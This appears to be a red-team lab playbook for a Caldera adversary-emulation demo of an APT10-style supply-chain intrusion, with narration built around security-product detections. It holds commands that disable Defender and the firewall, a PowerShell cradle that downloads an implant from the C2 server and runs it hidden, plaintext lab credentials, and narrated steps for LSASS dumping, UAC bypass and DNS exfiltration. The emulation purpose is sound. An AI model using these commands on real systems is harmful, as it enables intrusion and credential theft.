---
type: Operator Playbook
title: "Playbook — Operation Dark Pivot"
description: Step-by-step execution guide for demonstrating Operation Dark Pivot (APT10 supply chain compromise) in the Caldera lab. Covers pre-attack setup, agent deployment, operation launch, phase-by-phase narration, and cleanup.
tags:
  - playbook
  - operation
  - apt10
  - supply-chain
  - dns-exfil
  - dark-pivot
generated:
  by: claude-sonnet-4-6
  at: '2026-07-31T00:00:00Z'
status: stable
---

# Playbook — Operation Dark Pivot

**Scenario:** APT10 supply-chain compromise — developer station → domain controller → DNS exfil  
**Threat actor:** menuPass (Chinese state-sponsored, IP theft focus)  
**Duration:** 20–35 min active demo (sequential, 10–30s jitter)  
**Caldera instance:** caldera-2 — http://192.168.3.21:8888  
**Entry point:** windows-dev-station (192.168.8.31) — developer workstation, Server segment  
**Kill chain:** windows-dev-station → windows-client-11 → windows-dc  
**Tone for customer:** Patient. Technical. Living off the land. DNS exfil makes it invisible to HTTP-based DLP. The developer never noticed.

> **Unique setup note:** This operation uses **caldera-2** (192.168.3.21) — not caldera-1. The entry point is in the Server segment (192.168.8.x) and the C2 is in the Workstation segment (192.168.3.x), ensuring all beacon traffic crosses the firewall for inspection. Verify you are using the correct Caldera instance before launch.

---

## Pre-Attack Setup

**Do this before the customer enters the room.**

### 1. Disable defenses on all three target hosts

RDP or PowerShell into each host:

- **windows-dev-station** — 192.168.8.31 (lab-user / Paloalto1!)
- **windows-client-11** — 192.168.3.32 (lab-user / Paloalto1!)
- **windows-dc** — 192.168.1.31 (administrator / Paloalto1!)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

### 2. Plant the credential bait on windows-dev-station (optional but recommended)

This step enhances the narrative authenticity — it places the kind of artifacts a developer typically leaves around. Do this on windows-dev-station (192.168.8.31):

```powershell
# Create a .env file with a "leaked" credential
$envContent = @"
DB_HOST=192.168.1.31
DB_PORT=1433
DB_USER=lab-user
DB_PASSWORD=Paloalto1!
APP_SECRET=dev-secret-key-2024
"@
New-Item -Path "C:\Projects\forge-cli\.env" -ItemType File -Force
Set-Content "C:\Projects\forge-cli\.env" $envContent
```

This gives the credential-search ability something realistic to find, and you can show it to the customer during narration.

### 3. Verify caldera-2 is up and pre-configured

Open **http://192.168.3.21:8888** (admin / admin). Confirm:

- **Adversaries** → "Operation Dark Pivot - Supply Chain" exists (ID: `003e3455-d435-4353-be68-b5989a2fb371`)
- **Sources** → "Dark Pivot - Dev Segment" exists (ID: `a1b2c3d4-0003-0003-0003-000000000003`)
- **Agents** → no stale agents

### 4. Set the scene for the customer

Before the demo, explain the entry vector briefly:

> *"This scenario starts differently from the others. There's no phishing email. No stolen credential. The attacker compromised an internal package registry — the same tool the developers install automatically as part of their daily build. When the developer ran their build this morning, the malicious package spawned an implant and called home. They've been inside the server segment for six weeks. We're walking in at the moment they decide to move."*

### 5. Stage the XSIAM console

Open XSIAM on a separate display or screen share. This operation is slower — you can be more deliberate about switching between Caldera and XSIAM at key moments.

---

## Phase 1 — Deploy the Agent (Supply Chain Foothold)

**Narrative:** *"A developer ran their daily build. forge-cli 2.4.1 executed as expected. The build passed. The tests passed. They pushed their changes and went to get coffee. What they didn't see was the second process spawning beneath the build."*

### 6. RDP into windows-dev-station

Connect to **192.168.8.31** as `lab-user / Paloalto1!`.

Open PowerShell.

### 7. Deploy the Sandcat agent (simulating the malicious package payload)

Note the C2 is **caldera-2** (192.168.3.21), not caldera-1:

```powershell
$url="http://192.168.3.21:8888/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go-windows")
$data=$wc.DownloadData($url)
$name=$wc.ResponseHeaders["Content-Disposition"].Split("=")[1]
[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)
Start-Process -FilePath "C:\Users\Public\$name.exe" -ArgumentList "-server http://192.168.3.21:8888 -group red" -WindowStyle Hidden
```

### 8. Confirm agent check-in

Caldera-2 UI → **Agents** → agent for `windows-dev-station` appears.

> **Talking point:** *"The implant is running in the server segment. The C2 is in the workstation segment — the other side of the firewall. Every beacon from this machine crosses the VM-Series for inspection. That's deliberate in the lab — it's what would happen in a real network where the dev segment is segmented from user workstations."*

---

## Phase 2 — Launch the Operation

### 9. Create and launch the operation on caldera-2

Go to **http://192.168.3.21:8888** → **Operations** → **+ New Operation**.

| Field | Value |
|---|---|
| Name | `Operation Dark Pivot` |
| Adversary | `Operation Dark Pivot - Supply Chain` |
| Group | `red` |
| Planner | `atomic` |
| Fact Source | `Dark Pivot - Dev Segment` |
| Obfuscator | `steganography` |
| Jitter | `10/30` |
| Autonomous | `on` |
| Auto-close | `off` |
| Visibility | `51` |

Click **Start**.

> **Planner and obfuscator note:** Atomic planner executes abilities in strict sequence — each step is deliberate. Jitter is 10–30 seconds to model patient, slow beaconing. Steganography obfuscator hides commands in image files — beacon traffic looks like web browsing to a network sensor.

Via API:
```
POST http://192.168.3.21:8888/api/v2/operations
{
  "name": "Operation Dark Pivot",
  "adversary": {"adversary_id": "003e3455-d435-4353-be68-b5989a2fb371"},
  "group": "red",
  "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
  "source": {"id": "a1b2c3d4-0003-0003-0003-000000000003"},
  "obfuscator": "steganography",
  "jitter": "10/30",
  "autonomous": 1,
  "auto_close": false,
  "visibility": 51
}
```

---

## Phase 3 — Live Narration: Execution Walk-Through

Because jitter is 10–30s and the planner is atomic, this operation has natural pauses between abilities. Use those gaps to narrate and switch to XSIAM.

### Phase 3a — Explore the Dev Station (Abilities 1–3, ~3 min)

**Narrative:** *"They began, as they always did, by looking. The dev station was a goldmine — not because of what was on it, but because of what developers leave lying around."*

| Ability | What's happening | What to say |
|---|---|---|
| PowerShell execution | Confirms execution in build context | *"The implant is running under the same user account as the build process — lab-user. Legitimate context. Nothing suspicious about a build tool running PowerShell."* |
| System info | OS, hostname, domain, uptime collected | *"Domain member. Server segment. They can reach the internal package registry from here, CI/CD dashboards, deployment keys."* |
| Network connections | Active connections mapped | *"Who is this machine talking to? Internal registries, build servers. They're mapping the environment by watching the existing traffic."* |

### Phase 3b — Search for Secrets (Abilities 4–6, ~4 min)

**Narrative:** *"Developer machines are credential goldmines. Not because developers are careless — but because the tools they use require credentials to be accessible."*

| Ability | What's happening | What to say |
|---|---|---|
| Credentials in files | `.env`, `config.ini`, `appsettings.json`, unattend.xml scanned | *"A .env file in the project root. DB_PASSWORD in plaintext. Developers leave this in repositories all the time — it's a known antipattern, and it's exactly what APT10 hunts for."* |
| Windows Credential Manager | VaultCmd dumps saved credentials | *"The Windows Credential Manager holds saved credentials for internal systems — CI/CD, internal wikis. All of it accessible to the current user without elevation."* |
| Browser credential theft | Chrome/Edge/Firefox passwords extracted | *"The developer uses their browser to log into every internal system. Each saved password is now in the attacker's hands."* |

**Pause here.** Show the customer the `.env` file you planted (or browse to it in the file explorer on dev-station). Point out DB_PASSWORD.

> **Talking point:** *"This is one of the most common findings in developer environment assessments. The automation tools require credentials. The developers put them somewhere convenient. The attacker knows exactly where to look."*

### Phase 3c — Go Quiet (Abilities 7–11, ~4 min)

| Ability | What's happening | What to say |
|---|---|---|
| Avoid logs | PS transcript logging disabled | *"Cleaning up as they go. Real-time cleanup — not after the fact."* |
| Clear PS history | PowerShell history wiped | *"This session never happened."* |
| Clear event logs | Dev station Security/System/Application logs wiped | *"The footprint on the dev machine is now minimal. Forensically, the supply chain payload left almost nothing."* |
| Alternate Data Streams | Staged artifacts hidden in NTFS ADS | *"Anything they want to keep on the machine is hidden in ADS on files that will never be examined. Invisible to Explorer. Invisible to most forensic tools."* |

**Switch to XSIAM.** Show the Event ID 1102 (audit log cleared) alert if it fired. This is a high-confidence signal — legitimate processes rarely clear their own logs.

### Phase 3d — Map the Domain (Abilities 11–14, ~4 min)

| Ability | What's happening | What to say |
|---|---|---|
| Account discovery | Local and domain users listed | *"Same domain as the workstations. They can see every account from the dev machine."* |
| Adfind — computers | Full AD computer list | *"Every workstation, every server, the DC. The attacker has a complete map of the environment."* |
| Adfind — admin accounts | Domain admin accounts enumerated | *"They know every domain admin by name and last login time. They know which accounts are active."* |
| Admin enumerator | Privileged group membership | *"They're building a priority target list."* |

### Phase 3e — First Pivot to Workstation Segment (Ability 15)

**Narrative:** *"The workstation segment was one firewall rule away. They crossed it via SMB."*

| Ability | What's happening | What to say |
|---|---|---|
| SMB lateral to windows-client-11 | Sandcat copied via ADMIN$ to 192.168.3.32 | *"The credential from the .env file — or from the browser — works on windows-client-11's admin share. The attacker just crossed from the server segment into the workstation segment via a single SMB connection."* |

A second agent appears in caldera-2 for `windows-client-11`.

> **Talking point:** *"This is the segment crossing moment. The firewall should have stopped this — but the credential was valid, the protocol was SMB 445, and the share was ADMIN$. Many organizations don't block ADMIN$ between segments because it breaks management tooling. That's exactly what APT10 exploits."*

### Phase 3f — Escalate + Harvest on Workstation (Abilities 16–18, ~3 min)

Abilities now run on `windows-client-11` via the second agent.

| Ability | What's happening | What to say |
|---|---|---|
| UAC bypass (Fodhelper) | Elevated shell without UAC prompt | *"No popup. Fodhelper is signed by Microsoft. The elevation is invisible to the user."* |
| LSASS dump | Domain admin credentials from LSASS memory | *"Elevated context gives them LSASS access. The domain administrator hash is right there. This is the key they need for the final step."* |
| Enumerate privileged groups | DA group with elevated context | *"With elevation they can enumerate everything. Full domain admin group details."* |

**Pause.** Switch to XSIAM and show the LSASS memory access event. Walk through the process chain: Fodhelper → elevated shell → LSASS read. This is a textbook privilege escalation → credential access chain.

### Phase 3g — Persistence on Workstation (Abilities 19–20, ~2 min)

| Ability | What's happening | What to say |
|---|---|---|
| Scheduled task | Standard persistence on windows-client-11 | *"Reliability persistence — survives reboots."* |
| COM hijacking | COM server registration in HKCU | *"This is the interesting one. A COM hijack in the user's registry hive — no admin required, no elevated write. It loads automatically when certain applications launch. It survives credential rotation. Most IR playbooks don't look for it."* |

> **Talking point:** *"COM hijacking is one of the persistence mechanisms that consistently survives incident response. Teams reset passwords, reimage workstations, then miss the COM hijack because it's in HKCU — the user hive — and they only audit HKLM. The actor comes back through the same door two weeks later."*

### Phase 3h — Final Pivot to Domain Controller (Abilities 21)

| Ability | What's happening | What to say |
|---|---|---|
| Enable WinRM | Windows Remote Management enabled on windows-client-11 | *"WinRM — Windows Remote Management — is disabled by default in most environments. They enable it here to use as a lateral movement channel to the DC."* |
| WinRM lateral to windows-dc | Sandcat pushed to DC via WinRM | *"Administrator credential from LSASS. WinRM connection to the domain controller. Third agent. They're on the DC as administrator."* |

Third agent appears for `windows-dc`.

### Phase 3i — Own the Domain (Abilities 22–23, ~2 min)

| Ability | What's happening | What to say |
|---|---|---|
| Create domain admin account | `svc_monitor_03` appears in Active Directory | *"Indistinguishable from a monitoring service account. It'll still be there in six months."* |
| NTDS.dit copy | Shadow copy → NTDS.dit extracted | *"The entire Active Directory database. Every account. Every password hash. Every credential ever set — including accounts that were deleted years ago. Offline crackable at leisure."* |

### Phase 3j — Collect Intellectual Property (Abilities 24–26, ~4 min)

| Ability | What's happening | What to say |
|---|---|---|
| Automated file collection | Source code, docs, deployment configs staged | *"They know exactly what to look for — the developer's browser history mapped every internal system and where the files live. This is targeted collection, not bulk scraping."* |
| Browser history extraction | Chrome and Edge history collected | *"The browser history is a complete map of the internal environment. CI/CD dashboards, admin panels, Kubernetes management — every URL the developer visited is a pointer to something valuable."* |
| Archive with 7zip | Files compressed, password-protected, split into 50MB chunks | *"Looks like routine backup traffic. 50MB chunks. Spread across four hours."* |

### Phase 3k — DNS Exfiltration (Ability 27)

**Narrative:** *"Then it left through DNS."*

| Ability | What's happening | What to say |
|---|---|---|
| DNS exfil (DoH) | Archive chunks encoded into DNS subdomain queries, sent over DNS-over-HTTPS | *"Not HTTP — DNS. Each 50MB chunk is encoded into the subdomain field of a series of DNS queries. DNS-over-HTTPS means it's encrypted — looks like HTTPS to a packet sniffer. To a network sensor watching for large outbound transfers: nothing. Just DNS queries."* |

**Switch to XSIAM.** If DNS exfil detection is configured, show the anomaly — unusually long subdomain fields, high DNS query volume to a single resolver, unusual query patterns.

> **Talking point:** *"HTTP-based DLP would have caught a 200MB file transfer. But this left in DNS — a protocol most DLP solutions don't inspect deeply, and DNS-over-HTTPS encrypted the queries. This is why Cortex XDR's DNS analytics matter. Pattern recognition on query volume and subdomain length catches what signature-based tools miss."*

---

## Phase 4 — XSIAM Wrap-Up

Walk the full incident timeline:

1. **T+00:00** — Unexpected outbound connection from dev-station (build context process) — Initial Access
2. **T+02:00** — File access to `.env` from unusual process — Credential Access
3. **T+03:00** — VaultCmd.exe execution — Credential Access
4. **T+05:30** — Event log cleared on dev-station (Event ID 1102) — Defense Evasion
5. **T+08:00** — ADMIN$ write from server segment (192.168.8.x) to workstation segment (192.168.3.x) — Lateral Movement (segment crossing)
6. **T+09:00** — Fodhelper UAC bypass on windows-client-11 — Privilege Escalation
7. **T+09:30** — LSASS memory access on windows-client-11 — Credential Access
8. **T+10:30** — COM server registration in HKCU (unexpected key) — Persistence
9. **T+11:00** — WSMan/WinRM connection from workstation to DC — Lateral Movement
10. **T+13:00** — vssadmin + ntds.dit file access on DC — Credential Access / Impact
11. **T+17:00** — Sustained high-volume DNS queries, long subdomains — Exfiltration

**Key talking points:**

- *"The entry vector was invisible to perimeter and endpoint controls — it came through the build pipeline, a trusted process. XDR's behavioral analytics on process lineage caught it: a build tool doesn't make outbound network connections to workstation-segment hosts."*
- *"The segment crossing — SMB from 192.168.8.x to 192.168.3.x — is the moment the firewall should have flagged. The credential was valid, but the source segment was wrong. A microsegmentation policy or an identity-aware firewall rule would have stopped the pivot here."*
- *"The DNS exfil was the last move and the hardest to catch. Without DNS analytics and behavioral baseline, this would have been invisible."*

---

## Cleanup (After Demo)

```powershell
# Re-enable Windows Defender on all hosts
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableBehaviorMonitoring $false
Set-MpPreference -DisableIOAVProtection $false
Set-MpPreference -DisableScriptScanning $false
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# Remove backdoor domain admin account (run on DC)
Remove-ADUser -Identity "svc_monitor_03" -Confirm:$false

# Remove COM hijack registry entry (run on windows-client-11 as lab-user)
Remove-Item -Path "HKCU:\Software\Classes\CLSID\*" -Recurse -Force 2>$null

# Remove scheduled tasks
schtasks /delete /tn "* Sandcat *" /f 2>$null

# Kill Sandcat processes on all hosts
Get-Process | Where-Object { $_.Path -like "C:\Users\Public\*" } | Stop-Process -Force

# Remove the planted .env file (on dev-station)
Remove-Item "C:\Projects\forge-cli\.env" -Force 2>$null
```

In **caldera-2** (http://192.168.3.21:8888): **Operations** → stop/delete "Operation Dark Pivot". **Agents** → kill and delete all agents.

---

## Quick Reference

| Item | Value |
|---|---|
| Caldera URL | http://192.168.3.21:8888 (caldera-2) |
| Caldera creds | admin / admin |
| Entry point | windows-dev-station (192.168.8.31) lab-user / Paloalto1! |
| Adversary ID | 003e3455-d435-4353-be68-b5989a2fb371 |
| Fact Source ID | a1b2c3d4-0003-0003-0003-000000000003 |
| Planner | atomic |
| Obfuscator | steganography |
| Jitter | 10/30 |
| Expected duration | 20–35 min |
